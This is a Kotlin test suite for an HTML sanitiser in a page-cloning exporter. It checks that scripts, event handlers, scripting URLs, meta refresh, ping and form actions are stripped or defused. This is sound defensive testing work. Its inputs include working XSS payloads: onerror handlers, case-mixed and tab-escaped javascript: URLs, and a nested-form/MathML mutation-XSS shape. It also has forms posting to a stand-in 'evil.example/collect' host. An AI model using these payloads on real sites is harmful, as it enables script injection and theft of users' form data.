package dev.vibemotion.api.clone

import dev.vibemotion.api.clone.HtmlSanitiser.Companion.rewriteStyleText
import io.kotest.assertions.throwables.shouldThrow
import io.kotest.assertions.withClue
import io.kotest.core.spec.style.FunSpec
import io.kotest.matchers.nulls.shouldNotBeNull
import io.kotest.matchers.shouldBe
import io.kotest.matchers.string.shouldContain
import io.kotest.matchers.string.shouldNotContain
import org.jsoup.Jsoup
import org.jsoup.nodes.Comment
import org.jsoup.nodes.Document
import java.nio.charset.StandardCharsets
import java.nio.file.Files
import java.nio.file.Path

/**
 * The sanitiser on its own. [HtmlRewriterTest] already proves it does not change what a clone
 * produces; these are the guarantees the *exporter* relies on, where there is no CSP behind it
 * (DT-073), plus the three things the sanitiser deliberately does not do.
 */
class HtmlSanitiserTest :
    FunSpec({

        val sanitiser = HtmlSanitiser()

        fun sanitised(html: String): Document {
            val document = Jsoup.parse(html)
            document.outputSettings().prettyPrint(false).charset(StandardCharsets.UTF_8)
            sanitiser.sanitise(document)
            return document
        }

        test("promotes noscript content, because that is the page without its scripts") {
            val document = sanitised("<html><body><noscript><p class=fallback>JavaScript is off</p></noscript></body></html>")

            document.select("noscript").size shouldBe 0
            document.selectFirst("p.fallback").shouldNotBeNull().text() shouldBe "JavaScript is off"
        }

        test("re-parses noscript content that arrived as one text node of markup") {
            // Some parses hand `<noscript>` back as text; its elements must still be cleaned.
            val document = sanitised("<html><head><noscript>&lt;img src=x onerror=alert(1)&gt;</noscript></head><body></body></html>")

            document.outerHtml() shouldNotContain "onerror"
        }

        test("strips every comment, contents and all") {
            val document =
                sanitised(
                    "<!-- <head> --><html><head><!--[if lt IE 9]><script src=/ie.js></script><![endif]--></head>" +
                        "<body><p>keep me</p><!-- </body --></body></html>",
                )
            val html = document.outerHtml()

            html shouldNotContain "<!--"
            html shouldNotContain "ie.js"
            html shouldContain "keep me"
        }

        test("removes every element that can execute or re-root the document") {
            val document =
                sanitised(
                    "<html><head><base href=https://evil.example/></head><body><script>alert(1)</script>" +
                        "<iframe src=x></iframe><object data=x></object><embed src=x><applet code=x></applet><p>keep</p></body></html>",
                )

            document.select("script, iframe, frame, object, embed, applet, base").size shouldBe 0
            document.selectFirst("p").shouldNotBeNull().text() shouldBe "keep"
        }

        test("removes meta refresh, meta CSP and the preload family of links") {
            val document =
                sanitised(
                    """
                    <html><head>
                      <meta http-equiv="refresh" content="0;url=https://evil.example/">
                      <meta http-equiv="Content-Security-Policy" content="default-src *">
                      <link rel="preload" href="/a.js" as="script">
                      <link rel="dns-prefetch" href="//evil.example">
                      <link rel="manifest" href="/m.json">
                      <link rel="icon" href="/favicon.ico">
                    </head><body></body></html>
                    """.trimIndent(),
                )

            document.select("meta[http-equiv]").size shouldBe 0
            document.outerHtml() shouldNotContain "Content-Security-Policy"
            document.select("link[rel=preload], link[rel=dns-prefetch], link[rel=manifest]").size shouldBe 0
            document.selectFirst("link[rel=icon]").shouldNotBeNull().attr("href") shouldBe "/favicon.ico"
        }

        test("removes SMIL that retargets a URL or carries a scripting scheme, and keeps one that only moves pixels") {
            val document =
                sanitised(
                    """
                    <html><body><svg>
                      <a href="#"><animate attributeName="href" to="https://evil.example/"></animate></a>
                      <set attributeName="fill" to="javascript:alert(1)"></set>
                      <animateTransform attributeName="transform" type="rotate" from="0" to="360" dur="2s"></animateTransform>
                    </svg></body></html>
                    """.trimIndent(),
                )

            document.select("animate, set").size shouldBe 0
            document.selectFirst("animatetransform").shouldNotBeNull().attr("type") shouldBe "rotate"
        }

        test("removes every event handler and takes the data-vm- namespace back") {
            val document =
                sanitised(
                    """<html><body><div onclick="x()" ONMOUSEOVER="y()" data-vm-id="vm-9" data-vm-note="n" data-keep="k">hi</div></body></html>""",
                )
            val div = document.selectFirst("div").shouldNotBeNull()

            div.hasAttr("onclick") shouldBe false
            div.hasAttr("ONMOUSEOVER") shouldBe false
            div.hasAttr("data-vm-id") shouldBe false
            div.hasAttr("data-vm-note") shouldBe false
            div.attr("data-keep") shouldBe "k"
        }

        test("removes ping, which is a POST to a third party on every click") {
            val document =
                sanitised(
                    """<html><body><a href="/ok" ping="https://evil.example/t">ok</a>""" +
                        """<area href="/ok2" ping="https://evil.example/t"></body></html>""",
                )

            document.select("[ping]").size shouldBe 0
            document.selectFirst("a").shouldNotBeNull().attr("href") shouldBe "/ok"
        }

        test("defuses scripting schemes in navigation attributes, however they are written") {
            val document =
                sanitised(
                    """
                    <html><body>
                      <a id="plain" href="javascript:alert(1)">a</a>
                      <a id="mixed" href="JaVaScRiPt:alert(1)">b</a>
                      <a id="escaped" href="java&#9;script:alert(1)">c</a>
                      <a id="vb" href="vbscript:msgbox(1)">d</a>
                      <a id="datahtml" href="data:text/html,<script>alert(1)</script>">e</a>
                      <button id="fa" formaction="javascript:alert(1)">f</button>
                      <svg><use id="use" xlink:href="javascript:alert(1)"></use></svg>
                    </body></html>
                    """.trimIndent(),
                )

            listOf("plain", "mixed", "escaped", "vb", "datahtml").forEach { id ->
                withClue(id) { document.selectFirst("#$id").shouldNotBeNull().attr("href") shouldBe "#" }
            }
            // `formaction` is removed outright rather than defused; see the dedicated test below.
            document.selectFirst("#fa").shouldNotBeNull().hasAttr("formaction") shouldBe false
            document.selectFirst("#use").shouldNotBeNull().attr("xlink:href") shouldBe "#"
        }

        test("defuses a scripting url() in a style attribute and in a style block") {
            val document =
                sanitised(
                    """
                    <html><head><style>a { background: url(javascript:alert(1)); color: red }</style></head>
                    <body><div style="background: url(   javascript:alert(1))">x</div></body></html>
                    """.trimIndent(),
                )
            val html = document.outerHtml()

            html shouldNotContain "javascript:"
            document.selectFirst("div").shouldNotBeNull().attr("style") shouldContain """url("#")"""
            document.selectFirst("style").shouldNotBeNull().data() shouldContain """url("#")"""
        }

        test("a style block inside svg is removed outright, not defused") {
            // Whether a `<style>` in foreign content holds text or markup depends on the exact
            // insertion mode, and a browser and jsoup can disagree. Removing it is the only answer
            // that does not require re-implementing a parser. The cost — an inline icon's own CSS
            // — is accepted and recorded in docs/architecture.md.
            val document =
                sanitised(
                    """<html><body><svg><style>a{background:url(javascript:alert(1))} circle{fill:red}</style><circle/></svg></body></html>""",
                )

            document.select("svg style").size shouldBe 0
            document.outerHtml() shouldNotContain "javascript:"
            // Only the `<style>` goes; the drawing survives.
            document.selectFirst("svg").shouldNotBeNull()
            document.selectFirst("circle").shouldNotBeNull()
        }

        test("a style block with nothing to defuse is not rewritten at all") {
            val document = sanitised("<html><head><style>a > b { color: red }</style></head><body></body></html>")

            document.selectFirst("style").shouldNotBeNull().data() shouldBe "a > b { color: red }"
        }

        test("unwraps a nested form, because a browser ignores the inner start tag and jsoup does not") {
            // The differential this exists for: jsoup keeps the inner `<form>` and serialises it,
            // a browser drops the start tag, and everything after it lands one level higher.
            val document =
                sanitised("""<html><body><form id="outer"><p>a</p><form id="inner"><input name="q"></form></form></body></html>""")

            document.select("form").map { it.id() } shouldBe listOf("outer")
            // Unwrapped, not removed: the content it held is still there.
            document.selectFirst("input").shouldNotBeNull().attr("name") shouldBe "q"
            document.selectFirst("p").shouldNotBeNull().text() shouldBe "a"
        }

        test("unwraps forms nested three deep") {
            val document = sanitised("<html><body><form><form><form><input></form></form></form></body></html>")

            document.select("form").size shouldBe 1
            document.select("input").size shouldBe 1
        }

        test("removes every raw-text element from inside svg and math, integration points included") {
            val document =
                sanitised(
                    """
                    <html><body>
                      <svg><style>a{fill:red}</style><desc><style>b{fill:red}</style></desc>
                        <foreignObject><style>c{fill:red}</style><noembed>x</noembed></foreignObject></svg>
                      <math><mtext><mglyph><style>d{color:red}</style></mglyph><xmp>y</xmp></mtext></math>
                      <style>e{color:red}</style>
                    </body></html>
                    """.trimIndent(),
                )

            document.select("svg style, math style, svg noembed, math xmp").size shouldBe 0
            // An ordinary HTML `<style>` outside foreign content is untouched.
            document.selectFirst("body > style").shouldNotBeNull().data() shouldBe "e{color:red}"
            // The foreign elements themselves survive; only the ambiguous children go.
            document.select("svg").size shouldBe 1
            document.selectFirst("desc").shouldNotBeNull()
        }

        test("removes a form from foreign content, but keeps one inside an HTML integration point") {
            val document =
                sanitised(
                    """
                    <html><body>
                      <svg><g><form id="inSvg"><input name="a"></form></g>
                        <foreignObject><form id="inForeignObject" action="https://evil.example/c"><input name="b"></form></foreignObject></svg>
                      <math><mtext><form id="inMath"><input name="c"></form></mtext></math>
                    </body></html>
                    """.trimIndent(),
                )

            document.select("#inSvg").size shouldBe 0
            // `foreignObject` resumes ordinary HTML parsing, so the form is disarmed like any other.
            document.selectFirst("#inForeignObject").shouldNotBeNull().attr("action") shouldBe "#"
            // `mtext` is an integration point too, so the form survives, disarmed.
            document.selectFirst("#inMath").shouldNotBeNull().attr("action") shouldBe "#"
        }

        test("the nested-form-plus-MathML-style shape leaves nothing a browser could run") {
            // The document that proved jsoup is not an oracle: the `<style>` lands in MathML, where
            // it is not a raw-text element, and its contents become live elements in a browser.
            val document =
                sanitised(
                    """<html><body><form><math><mtext></form><form><mglyph><style></math><img src onerror="x()"></body></html>""",
                )

            document.select("style").size shouldBe 0
            document.outerHtml() shouldNotContain "onerror"
        }

        test("a style element whose CSS is split across several text nodes is rewritten whole") {
            // After `stripComments`, a foreign `<style>` that held a comment has two adjacent text
            // nodes; rewriting only a single child silently skipped it and left the CSS untouched.
            val document = Jsoup.parse("<svg><style>a{color:red}<!--x-->b{color:blue}</style></svg>")
            val style = document.selectFirst("style").shouldNotBeNull()
            style.childNodes().filterIsInstance<Comment>().forEach { it.remove() }
            style.childNodeSize() shouldBe 2

            style.rewriteStyleText { css -> css.replace("color", "COLOR") }

            style.wholeText() shouldBe "a{COLOR:red}b{COLOR:blue}"
        }

        test("removes formaction and its companions wherever the form action is neutralised") {
            // `formaction` on a submit button overrides `action`, so neutralising the form alone
            // still let an exported page post to a third party.
            val document =
                sanitised(
                    """
                    <html><body><form action="https://evil.example/c" target="_top">
                      <button id="b" formaction="https://evil.example/collect" formmethod="post" formtarget="_blank" formenctype="text/plain">go</button>
                      <input id="i" type="submit" formaction="javascript:x()">
                    </form></body></html>
                    """.trimIndent(),
                )
            val button = document.selectFirst("#b").shouldNotBeNull()

            document.selectFirst("form").shouldNotBeNull().attr("action") shouldBe "#"
            listOf("formaction", "formmethod", "formtarget", "formenctype").forEach { attribute ->
                withClue(attribute) { button.hasAttr(attribute) shouldBe false }
            }
            document.selectFirst("#i").shouldNotBeNull().hasAttr("formaction") shouldBe false
            document.outerHtml() shouldNotContain "evil.example/collect"
        }

        test("keeps forms but disarms them") {
            val form =
                sanitised(
                    """<html><body><form action="https://evil.example/collect" method="post" target="_top"><input name="email"></form></body></html>""",
                ).selectFirst("form")

            form.shouldNotBeNull()
            form.attr("action") shouldBe "#"
            form.hasAttr("target") shouldBe false
            form.attr("method") shouldBe "post"
            form.selectFirst("input").shouldNotBeNull().attr("name") shouldBe "email"
        }

        test("is base-free: no URL is resolved, no stylesheet is inlined, no id is assigned, no charset is added") {
            val document =
                sanitised(
                    """<html><head><link rel="stylesheet" href="/site.css"></head><body><a href="/docs">d</a><img src="img/a.png"></body></html>""",
                )

            document.selectFirst("a").shouldNotBeNull().attr("href") shouldBe "/docs"
            document.selectFirst("img").shouldNotBeNull().attr("src") shouldBe "img/a.png"
            // The link is still a link: inlining it needs a fetcher, which the sanitiser has not got.
            document.selectFirst("link[rel=stylesheet]").shouldNotBeNull().attr("href") shouldBe "/site.css"
            document.select("style[data-vm-source]").size shouldBe 0
            document.select("[data-vm-id]").size shouldBe 0
            document.select("meta[charset]").size shouldBe 0
        }

        test("is idempotent: sanitising its own output changes nothing") {
            val hostile = fixture("hostile.html")
            val once = sanitised(hostile)
            val twice = sanitised(once.outerHtml())

            twice.outerHtml() shouldBe once.outerHtml()
        }

        test("a document that was already sanitised keeps every class attribute exactly as written") {
            val document = sanitised("""<html><body><div class="a  b   c">x</div></body></html>""")

            document.selectFirst("div").shouldNotBeNull().attr("class") shouldBe "a  b   c"
        }

        test("stops at the deadline rather than running every stage") {
            var remaining = 1
            val expiring = DeadlineCheck { if (remaining-- <= 0) throw CloneException.Unreachable("timed out") }

            shouldThrow<CloneException.Unreachable> {
                sanitiser.sanitise(Jsoup.parse(fixture("hostile.html")), expiring)
            }
        }
    })

private fun fixture(name: String): String = Files.readString(Path.of("src/test/resources/clone", name))
